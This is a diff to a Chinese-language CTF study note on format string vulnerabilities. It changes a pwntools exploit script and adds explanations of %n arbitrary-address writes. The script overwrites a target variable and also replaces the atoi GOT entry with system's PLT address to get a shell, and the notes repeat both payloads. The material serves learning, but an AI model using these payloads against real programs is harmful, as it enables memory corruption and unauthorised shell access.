@@ -82,19 +82,21 @@ elf = ELF("./pwn")
 atoi_got = elf.got["atoi"]
 system_plt = elf.plt["system"]
 
-payload1 = p32(0x804c044) + b"%10$n"
-payload2 = fmtstr_payload(10, {0x804c044: 1})
-payload3 = fmtstr_payload(10, {atoi_got: system_plt})
+payload1_1 = p32(0x804c044) + b"%10$n"
+payload1_2 = b"%4c%12$n" + p32(0x804c044)
+payload1_3 = fmtstr_payload(10, {0x804c044: 4})
+
+payload2_1 = p32(atoi_got) + b"%" + str(system_plt-4).encode() + b"c%10$n"
+payload2_3 = fmtstr_payload(10, {atoi_got: system_plt})
 
 p.recvuntil("your name:")
-p.sendline(payload3)
+p.sendline(payload1_1)
 
 payload1 = b"4"
-payload2 = b"1"
-payload3 = b"/bin/bash\x00"
+payload2 = b"/bin/bash\x00"
 
 p.recvuntil("your passwd:")
-p.sendline(payload3)
+p.sendline(payload1)
 
 p.interactive()
 ```
@@ -116,3 +118,17 @@ p.interactive()
 通过 **%n$x** 可以打印栈中任意位置 **数据A** 的值，或者通过 **%n$s** 可以打印栈中任意位置 **数据B** 的值，n为偏移量控制栈的位置，一般 n>=1。
 
 也可以使用 **地址+%n$s** 打印任意地址中保存的内容，此时 **n** 为输入内容相对于 **printf** 的偏移量。
+
+格式化字符串漏洞任意地址写入：
+
+> %c : 输出字符，可以配合 **%n** 使用
+
+> %n : 把已经成功输出的字符个数写入对应的整型指针参数所指的变量中
+
+例如，可以使用 **p32(0x804c044) + b"%10$n"**，将 4 写入 **0x804c044** 中，因为 **p32(0x804c044)** 打印出来是4个字符；
+
+也可以使用 **p32(atoi_got) + b"%" + str(system_plt-4).encode() + b"c%10$n"** 将 **atoi** 函数的GOT地址修改为 **system** 函数的PLT地址****。
+
+格式化字符串漏洞未解之疑惑：
+
+在使用任意地址写入时，可以将要写入内容的地址放在前面，也可以将该地址放在后面，还没弄明白这两者的区别，有待解决。
